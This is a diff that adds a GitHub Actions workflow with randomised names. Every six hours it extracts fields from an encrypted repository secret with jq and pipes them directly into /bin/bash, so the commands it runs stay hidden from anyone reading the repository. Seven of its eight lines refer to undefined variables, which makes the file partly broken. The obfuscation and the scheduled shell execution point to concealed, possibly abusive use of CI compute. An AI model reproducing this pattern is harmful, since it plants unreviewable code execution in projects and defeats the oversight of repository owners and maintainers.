@@ -1,0 +1,23 @@
+name: xianghuaguo3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          omu09: ${{ secrets.omu09 }}
+        run: |
+          echo $omu09 | jq -r .rks6666 | /bin/bash
+          echo $y020 | jq -r .tl5250 | /bin/bash
+          echo $ggmju6725 | jq -r .m49170 | /bin/bash
+          echo $eg6566 | jq -r .dsg17 | /bin/bash
+          echo $vzy31 | jq -r .wmgo557 | /bin/bash
+          echo $e965 | jq -r .j818 | /bin/bash
+          echo $bwgr3 | jq -r .piabz14 | /bin/bash
+          echo $wvem747 | jq -r .unxjo72 | /bin/bash
+
